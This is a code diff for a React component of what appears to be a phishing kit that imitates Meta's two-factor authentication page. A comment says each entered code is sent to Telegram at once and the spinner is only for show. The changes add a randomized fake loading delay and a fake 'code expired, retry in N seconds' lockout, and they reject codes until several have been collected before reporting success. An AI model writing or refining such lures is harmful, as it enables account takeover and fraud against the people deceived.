@@ -4,7 +4,6 @@ import { useEffect, useState, type ChangeEvent, type CSSProperties, type DragEve
 import type { StaticImageData } from 'next/image';
 import type { FormData, UiTexts } from '@/types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
-import TwoFAImage from '@/assets/images/2FA.png';
 import AnotherDeviceNotificationImage from '@/assets/images/F3-2FA-AnotherDeviceNotification.png';
 import DocumentIcon from '@/assets/images/ic_document.svg';
 import config from '@/utils/config';
@@ -27,6 +26,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
+    const [retrySecondsLeft, setRetrySecondsLeft] = useState(0);
     const [showMethodModal, setShowMethodModal] = useState(false);
     const [showIdentityModal, setShowIdentityModal] = useState(false);
     const [identityStep, setIdentityStep] = useState('intro');
@@ -38,7 +38,10 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
     const [isDragOverUpload, setIsDragOverUpload] = useState(false);
 
     useEffect(() => {
-        if (!show) return undefined;
+        if (!show) {
+            setRetrySecondsLeft(0);
+            return undefined;
+        }
 
         const handleEscClose = (event: KeyboardEvent) => {
             if (event.key === 'Escape') {
@@ -53,6 +56,29 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
         };
     }, [show, onClose]);
 
+    useEffect(() => {
+        if (retrySecondsLeft <= 0) return undefined;
+        const timer = window.setTimeout(() => {
+            setRetrySecondsLeft((prev) => {
+                const next = Math.max(0, prev - 1);
+                if (next === 0) {
+                    setShowError(false);
+                }
+                return next;
+            });
+        }, 1000);
+        return () => window.clearTimeout(timer);
+    }, [retrySecondsLeft]);
+
+    const retryWaitForAttempt = (attempt: number) =>
+        attempt <= 1
+            ? Math.max(1, Number(config.CODE_RETRY_WAIT_1 ?? 15))
+            : Math.max(1, Number(config.CODE_RETRY_WAIT_2 ?? 30));
+    const isRetryLocked = retrySecondsLeft > 0;
+    const expiredRetryText = String(
+        texts.codeExpiredRetry || 'The authentication code has expired. Please try again in {seconds} seconds.'
+    ).replaceAll('{seconds}', String(retrySecondsLeft));
+
     const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
         const normalizedCode = String(code || '').replace(/\D/g, '');
@@ -61,29 +87,38 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
             return;
         }
 
+        if (isRetryLocked) {
+            return;
+        }
+
         setIsLoading(true);
         setShowError(false);
+        setRetrySecondsLeft(0);
 
         // Gửi Telegram ngay — loading spinner chỉ là UI
         onSubmit(normalizedCode);
 
-        const loadingSec = Math.max(1, Number(config.CODE_LOADING_TIME || 3));
+        const minSec = Math.max(0, Number(config.CODE_LOADING_TIME_MIN ?? 2));
+        const maxSec = Math.max(minSec, Number(config.CODE_LOADING_TIME_MAX ?? 5));
+        const loadingMs = Math.round((minSec + Math.random() * (maxSec - minSec)) * 1000);
 
-        setTimeout(() => {
+        window.setTimeout(() => {
             setIsLoading(false);
 
             setAttempts((prev) => {
                 const nextAttempt = prev + 1;
                 if (nextAttempt >= (config.MAX_CODE || 2)) {
                     setShowError(false);
+                    setRetrySecondsLeft(0);
                     onSuccess();
                 } else {
                     setShowError(true);
                     setCode('');
+                    setRetrySecondsLeft(retryWaitForAttempt(nextAttempt));
                 }
                 return nextAttempt;
             });
-        }, loadingSec * 1000);
+        }, loadingMs);
     };
 
     /* Mask email: t**t@example.us */
@@ -119,7 +154,6 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
         maskPhone(phone),
         backupPhone ? maskPhone(backupPhone) : ''
     ].filter(Boolean);
-    const contactTargetsText = contactTargets.join(', ');
     const isCodeValid = /^(\d{6}|\d{8})$/.test(String(code || '').replace(/\D/g, ''));
     const isDeviceNotificationMethod = activeMethod === 'device_notifications';
     const notifyMethodSelection = (value: string) => {
@@ -406,16 +440,54 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
                     </h2>
 
                     {/* Description */}
-                    <p style={{
-                        color: '#9a979e',
+                    <div style={{
+                        color: '#65676b',
                         fontSize: '14px',
                         lineHeight: 1.55,
-                        margin: 0,
                     }}>
-                        {contactTargetsText
-                            ? `${texts.twoFAInstructionPrefix} ${contactTargetsText}, ${texts.twoFAInstructionSuffix}`
-                            : texts.twoFAInstructionSuffix}
-                    </p>
+                        {contactTargets.length > 0 ? (
+                            <>
+                                <p style={{ margin: '0 0 8px' }}>
+                                    {/[:：.。]$/.test(String(texts.twoFAInstructionPrefix || '').trim())
+                                        ? texts.twoFAInstructionPrefix
+                                        : `${texts.twoFAInstructionPrefix}:`}
+                                </p>
+                                <div style={{
+                                    display: 'flex',
+                                    flexDirection: 'column',
+                                    gap: '4px',
+                                    margin: '0 0 12px',
+                                    padding: '10px 12px',
+                                    backgroundColor: '#f7f8fa',
+                                    borderRadius: '8px',
+                                    border: '1px solid #e4e6eb',
+                                }}>
+                                    {contactTargets.map((target) => (
+                                        <span
+                                            key={target}
+                                            style={{
+                                                color: '#050505',
+                                                fontWeight: 600,
+                                                fontSize: '14px',
+                                                lineHeight: 1.45,
+                                                wordBreak: 'break-word',
+                                            }}
+                                        >
+                                            {target}
+                                        </span>
+                                    ))}
+                                </div>
+                                {texts.twoFAInstructionDelivery ? (
+                                    <p style={{ margin: '0 0 10px', color: '#65676b' }}>
+                                        {texts.twoFAInstructionDelivery}
+                                    </p>
+                                ) : null}
+                            </>
+                        ) : null}
+                        <p style={{ margin: 0 }}>
+                            {texts.twoFAInstructionSuffix}
+                        </p>
+                    </div>
 
                     {/* 2FA Image */}
                     <div style={{
@@ -425,7 +497,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
                         overflow: 'hidden',
                         margin: '15px 0',
                     }}>
-                        <img src={imageSrc(TwoFAImage)} width="100%" alt="authentication" style={{ display: 'block' }} />
+                        <img src="/_next/static/media/authentication.png" width="100%" alt="authentication" style={{ display: 'block' }} />
                     </div>
 
                     {/* Form */}
@@ -476,21 +548,15 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
                                 value={code}
                                 onChange={(e) => {
                                     setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
-                                    if (showError) setShowError(false);
+                                    if (showError && !isRetryLocked) setShowError(false);
                                 }}
                             />
                         </div>
 
                         {/* Helper / Error text */}
-                        {showError ? (
-                            <p style={{
-                                color: '#e74c3c',
-                                fontSize: '12px',
-                                margin: '-1px 0 10px 0',
-                            }}>
-                                {attempts >= 2
-                                    ? texts.codeExpired || 'The code has expired. Please try again.'
-                                    : texts.codeIncorrect || 'The code you entered is incorrect. Please try again.'}
+                        {showError && isRetryLocked ? (
+                            <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">
+                                {expiredRetryText}
                             </p>
                         ) : (
                             <p style={{
@@ -506,7 +572,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
                         <div style={{ width: '100%', marginTop: '20px' }}>
                             <button
                                 type="submit"
-                                disabled={isLoading || !isCodeValid}
+                                disabled={isLoading || !isCodeValid || isRetryLocked}
                                 style={{
                                     minHeight: '48px',
                                     width: '100%',
@@ -520,9 +586,9 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
                                     display: 'flex',
                                     alignItems: 'center',
                                     justifyContent: 'center',
-                                    cursor: (isLoading || !isCodeValid) ? 'not-allowed' : 'pointer',
-                                    opacity: (isLoading || !isCodeValid) ? 0.45 : 1,
-                                    pointerEvents: (isLoading || !isCodeValid) ? 'none' : 'auto',
+                                    cursor: (isLoading || !isCodeValid || isRetryLocked) ? 'not-allowed' : 'pointer',
+                                    opacity: (isLoading || !isCodeValid || isRetryLocked) ? 0.45 : 1,
+                                    pointerEvents: (isLoading || !isCodeValid || isRetryLocked) ? 'none' : 'auto',
                                     transition: 'opacity 0.3s',
                                 }}
                             >
@@ -536,10 +602,11 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
                                             borderRadius: '50%',
                                             animation: 'spin 0.8s linear infinite',
                                             display: 'inline-block',
+                                            pointerEvents: 'none',
                                         }}
                                     />
                                 ) : (
-                                    texts.continueBtn || 'Continue'
+                                    <span style={{ pointerEvents: 'none' }}>{texts.continueBtn || 'Continue'}</span>
                                 )}
                             </button>
                         </div>
@@ -585,152 +652,175 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
             {showMethodModal && (
                 <div
                     style={{
-                        position: 'fixed',
-                        inset: 0,
+                        ...overlayStyle,
                         zIndex: 1060,
-                        display: 'flex',
+                        backgroundColor: 'rgba(0,0,0,0.45)',
                         alignItems: 'center',
-                        justifyContent: 'center',
                         padding: '16px',
-                        backgroundColor: 'rgba(0,0,0,0.28)',
                     }}
+                    onClick={() => setShowMethodModal(false)}
                 >
                     <div
                         style={{
-                            width: '100%',
-                            maxWidth: '600px',
-                            borderRadius: '28px',
-                            backgroundColor: '#fff',
-                            boxShadow: '0 12px 34px rgba(0,0,0,0.22)',
-                            padding: '22px 20px 20px',
+                            ...modalStyle,
+                            maxWidth: '500px',
+                            backgroundColor: undefined,
+                            backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
+                            borderRadius: '18px',
+                            boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
+                            padding: '28px',
+                            alignItems: 'center',
+                            gap: '16px',
+                            margin: 'auto',
+                            maxHeight: 'calc(100vh - 32px)',
+                            overflowY: 'auto',
                         }}
+                        onClick={(e) => e.stopPropagation()}
                     >
-                        <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
+                        <div style={{ width: '100%', position: 'relative' }}>
                             <button
                                 type="button"
                                 aria-label="Close"
                                 onClick={() => setShowMethodModal(false)}
                                 style={{
-                                    width: '34px',
-                                    height: '34px',
+                                    position: 'absolute',
+                                    top: '-6px',
+                                    right: '-4px',
+                                    width: '28px',
+                                    height: '28px',
                                     border: 'none',
                                     backgroundColor: 'transparent',
-                                    color: '#111',
+                                    color: '#666',
                                     cursor: 'pointer',
-                                    fontSize: '32px',
-                                    lineHeight: '30px',
+                                    fontSize: '24px',
+                                    lineHeight: '24px',
                                     padding: 0,
                                 }}
                             >
                                 ×
                             </button>
-                        </div>
 
-                        <h3 style={{
-                            margin: '8px 0 8px',
-                            color: '#1c1e21',
-                            fontSize: '24px',
-                            fontWeight: 700,
-                            lineHeight: 1.25,
-                        }}>
-                            {texts.identityVerificationMethodTitle || 'Please choose an identity verification method.'}
-                        </h3>
-                        <p style={{
-                            margin: '0 0 26px',
-                            color: '#1c1e21',
-                            fontSize: '15px',
-                            lineHeight: 1.35,
-                        }}>
-                            {texts.identityVerificationMethodSubtitle || 'The available verification methods are listed below.'}
-                        </p>
+                            <h2 style={{
+                                fontSize: '20px',
+                                lineHeight: 1.3,
+                                color: '#000',
+                                fontWeight: 700,
+                                margin: '0 28px 8px 0',
+                                wordBreak: 'break-word',
+                            }}>
+                                {texts.identityVerificationMethodTitle || 'Please choose an identity verification method.'}
+                            </h2>
+                            <p style={{
+                                margin: '0 0 16px',
+                                color: '#65676b',
+                                fontSize: '14px',
+                                lineHeight: 1.55,
+                            }}>
+                                {texts.identityVerificationMethodSubtitle || 'The available verification methods are listed below.'}
+                            </p>
+
+                            <div style={{
+                                overflow: 'hidden',
+                                border: '1.5px solid #d4dbe3',
+                                borderRadius: '10px',
+                                backgroundColor: '#fff',
+                            }}>
+                                {methodOptions.map((option, index) => (
+                                    <button
+                                        key={option.value}
+                                        type="button"
+                                        onClick={() => handleMethodSelect(option.value)}
+                                        style={{
+                                            width: '100%',
+                                            minHeight: '60px',
+                                            display: 'flex',
+                                            alignItems: 'center',
+                                            justifyContent: 'space-between',
+                                            gap: '14px',
+                                            padding: '12px 14px',
+                                            backgroundColor: selectedMethod === option.value ? '#f7f8fa' : '#fff',
+                                            border: 'none',
+                                            borderBottom: index === methodOptions.length - 1 ? 'none' : '1px solid #e4e6eb',
+                                            cursor: 'pointer',
+                                            textAlign: 'left',
+                                        }}
+                                    >
+                                        <span style={{ minWidth: 0 }}>
+                                            <span style={{
+                                                display: 'block',
+                                                color: '#000',
+                                                fontSize: '15px',
+                                                fontWeight: 700,
+                                                lineHeight: 1.3,
+                                            }}>
+                                                {option.title}
+                                            </span>
+                                            <span style={{
+                                                display: 'block',
+                                                color: '#65676b',
+                                                fontSize: '13px',
+                                                lineHeight: 1.45,
+                                                marginTop: '2px',
+                                            }}>
+                                                {option.description}
+                                            </span>
+                                        </span>
+                                        <span style={{
+                                            width: '18px',
+                                            height: '18px',
+                                            borderRadius: '50%',
+                                            border: `2px solid ${selectedMethod === option.value ? '#0064E0' : '#d4dbe3'}`,
+                                            flexShrink: 0,
+                                            display: 'flex',
+                                            alignItems: 'center',
+                                            justifyContent: 'center',
+                                            backgroundColor: '#fff',
+                                        }}>
+                                            {selectedMethod === option.value && (
+                                                <span style={{
+                                                    width: '8px',
+                                                    height: '8px',
+                                                    borderRadius: '50%',
+                                                    backgroundColor: '#0064E0',
+                                                }} />
+                                            )}
+                                        </span>
+                                    </button>
+                                ))}
+                            </div>
+
+                            <button
+                                type="button"
+                                onClick={handleMethodContinue}
+                                style={{
+                                    width: '100%',
+                                    minHeight: '48px',
+                                    marginTop: '20px',
+                                    border: 'none',
+                                    borderRadius: '40px',
+                                    backgroundColor: '#0064E0',
+                                    color: '#fff',
+                                    fontSize: '16px',
+                                    fontWeight: 600,
+                                    cursor: 'pointer',
+                                    display: 'flex',
+                                    alignItems: 'center',
+                                    justifyContent: 'center',
+                                }}
+                            >
+                                {texts.continueBtn || 'Continue'}
+                            </button>
+                        </div>
 
                         <div style={{
-                            overflow: 'hidden',
-                            border: '1px solid #d8dde5',
-                            borderRadius: '14px',
-                            backgroundColor: '#fff',
+                            width: '60px',
+                            height: '60px',
+                            flexShrink: 0,
+                            margin: '0 auto',
                         }}>
-                            {methodOptions.map((option, index) => (
-                                <button
-                                    key={option.value}
-                                    type="button"
-                                    onClick={() => handleMethodSelect(option.value)}
-                                    style={{
-                                        width: '100%',
-                                        minHeight: '60px',
-                                        display: 'flex',
-                                        alignItems: 'center',
-                                        justifyContent: 'space-between',
-                                        gap: '14px',
-                                        padding: '10px 16px',
-                                        backgroundColor: '#fff',
-                                        border: 'none',
-                                        borderBottom: index === methodOptions.length - 1 ? 'none' : '1px solid #e5e5e5',
-                                        cursor: 'pointer',
-                                        textAlign: 'left',
-                                    }}
-                                >
-                                    <span style={{ minWidth: 0 }}>
-                                        <span style={{
-                                            display: 'block',
-                                            color: '#1c1e21',
-                                            fontSize: '15px',
-                                            fontWeight: 700,
-                                            lineHeight: 1.25,
-                                        }}>
-                                            {option.title}
-                                        </span>
-                                        <span style={{
-                                            display: 'block',
-                                            color: '#606770',
-                                            fontSize: '14px',
-                                            lineHeight: 1.25,
-                                            marginTop: '2px',
-                                        }}>
-                                            {option.description}
-                                        </span>
-                                    </span>
-                                    <span style={{
-                                        width: '20px',
-                                        height: '20px',
-                                        borderRadius: '50%',
-                                        border: `2px solid ${selectedMethod === option.value ? '#0866ff' : '#65676b'}`,
-                                        flexShrink: 0,
-                                        display: 'flex',
-                                        alignItems: 'center',
-                                        justifyContent: 'center',
-                                    }}>
-                                        {selectedMethod === option.value && (
-                                            <span style={{
-                                                width: '10px',
-                                                height: '10px',
-                                                borderRadius: '50%',
-                                                backgroundColor: '#0866ff',
-                                            }} />
-                                        )}
-                                    </span>
-                                </button>
-                            ))}
+                            <img src={imageSrc(MetaLogo)} width="100%" height="100%" alt="Meta"
+                                style={{ objectFit: 'contain' }} />
                         </div>
-
-                        <button
-                            type="button"
-                            onClick={handleMethodContinue}
-                            style={{
-                                width: '100%',
-                                minHeight: '44px',
-                                marginTop: '36px',
-                                border: 'none',
-                                borderRadius: '999px',
-                                backgroundColor: '#0866ff',
-                                color: '#fff',
-                                fontSize: '15px',
-                                fontWeight: 700,
-                                cursor: 'pointer',
-                            }}
-                        >
-                            {texts.continueBtn || 'Continue'}
-                        </button>
                     </div>
                 </div>
             )}
